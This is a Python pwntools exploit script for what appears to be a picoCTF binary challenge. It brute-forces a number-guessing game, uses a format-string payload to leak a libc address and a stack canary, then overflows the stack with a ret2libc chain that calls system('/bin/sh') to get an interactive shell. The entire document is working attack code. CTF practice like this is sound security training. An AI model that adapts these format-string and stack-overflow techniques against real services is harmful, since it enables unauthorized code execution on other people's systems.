from pwn import *
from struct import pack

e = ELF("./vuln")
libc = ELF("./libc.so.6")

context.binary = e.path

is_remote = "--remote" in sys.argv
def debug():
  if not is_remote:
    gdb.attach(p)

if is_remote:
  p = remote("jupiter.challenges.picoctf.org", 50589)
else:
  p = process(e.path)
  #, env={"LD_PRELOAD": libc.path})



for i in range(31, 40000, 3023 - 31):
  p.sendlineafter("guess?", "-" + str(i))
  p.recvline()

  if "Congrats!" in p.recvline():
    break

debug()
p.sendlineafter("Name?", "%15$s;;;%135$x".ljust(0x20, "\x00") + p32(e.got["printf"]))

p.recvuntil("Congrats: ")
leak = u32(p.recv(4)) - libc.symbols["printf"]
print(hex(leak))

p.recvuntil(";;;")
sleak = int(p.recvline(), 16)
print(hex(sleak))

for i in range(31, 40000, 3023 - 31):
  p.sendlineafter("guess?", "-" + str(i))
  p.recvline()

  if "Congrats!" in p.recvline():
    break

p.sendlineafter("Name?", "A" * 0x200 + p32(sleak) + "A" * 8 + p32(0x1337) + p32(leak + libc.symbols["system"]) + p32(0) + p32(leak + next(libc.search("/bin/sh"))))


p.interactive()
